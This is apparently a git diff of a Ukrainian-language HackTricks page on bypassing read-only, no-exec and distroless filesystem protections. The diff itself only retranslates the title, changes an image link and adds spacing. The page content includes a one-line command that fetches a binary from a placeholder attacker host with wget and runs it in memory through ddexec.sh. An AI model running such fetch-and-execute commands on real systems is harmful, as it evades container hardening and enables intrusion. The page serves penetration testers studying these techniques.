@@ -1,4 +1,4 @@
-# Обхід захисту файлової системи: тільки для читання / без виконання / Distroless
+# Bypass FS protections: read-only / no-exec / Distroless
 
 <details>
 
@@ -14,7 +14,7 @@
 
 </details>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/ua/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>
 
 Якщо вас цікавить **кар'єра хакера** і взламати невзламне - **ми шукаємо співробітників!** (_вимагається вільне володіння польською мовою, як письмово, так і усно_).
 
@@ -81,10 +81,12 @@ securityContext:
 {% hint style="success" %}
 **DDexec / EverythingExec** дозволить вам завантажувати та **виконувати** ваш власний **шелл-код** або **будь-який бінарний файл** з **пам'яті**.
 {% endhint %}
+
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
+
 Для отримання додаткової інформації про цю техніку перевірте Github або:
 
 {% content-ref url="ddexec.md" %}
